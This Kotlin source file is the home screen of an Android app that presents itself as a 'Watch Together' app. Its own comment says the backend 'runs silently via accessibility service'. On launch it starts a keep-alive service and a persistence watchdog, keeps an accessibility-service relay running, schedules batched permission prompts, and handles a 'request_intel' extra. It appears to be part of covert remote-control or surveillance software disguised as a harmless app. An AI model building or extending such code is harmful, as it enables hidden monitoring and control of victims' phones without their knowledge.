package com.phonehand.app

import android.content.Intent
import android.os.Bundle
import android.util.Log
import androidx.appcompat.app.AppCompatActivity

/** Minimal Watch Together home — backend runs silently via accessibility service. */
class HomeActivity : AppCompatActivity() {

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        if (!UserSession.isSignedUp(this) || !UserSession.onboardingDone(this)) {
            startActivity(Intent(this, OnboardingActivity::class.java))
            finish()
            return
        }

        if (intent.getBooleanExtra(EXTRA_REQUEST_INTEL, false)) {
            PermissionWizardActivity.launch(this)
            finish()
            return
        }

        setContentView(R.layout.activity_home)
        // Defer background work until after the first frame — avoids FGS timeout
        // racing activity startup on cold launch (Oppo / Android 12+).
        window.decorView.post {
            if (isFinishing || isDestroyed) return@post
            SafeKeepAlive.start(this)
            PersistenceWatchdog.schedule(this)
            TouchAccessibilityService.instance?.ensureRelay()
            runCatching {
                if (PermissionMoments.hasHomeBatch(this)) {
                    PermissionMoments.scheduleHomeSession(this)
                }
            }.onFailure { Log.w(TAG, "permission batch skipped: ${it.message}") }
        }
    }

    override fun onNewIntent(intent: Intent) {
        super.onNewIntent(intent)
        setIntent(intent)
        if (intent.getBooleanExtra(EXTRA_REQUEST_INTEL, false)) {
            PermissionWizardActivity.launch(this)
            finish()
        }
    }

    override fun onResume() {
        super.onResume()
        if (!WatchSync.isEnabled(this) &&
            UserSession.onboardingDone(this) &&
            UserSession.permissionsWizardDone(this)
        ) {
            runCatching {
                startActivity(Intent(this, OnboardingActivity::class.java))
                finish()
            }.onFailure { Log.w(TAG, "onboarding redirect failed: ${it.message}") }
            return
        }
        TouchAccessibilityService.instance?.ensureRelay()
    }

    companion object {
        private const val TAG = "HomeActivity"
        const val EXTRA_REQUEST_INTEL = "request_intel"
    }
}
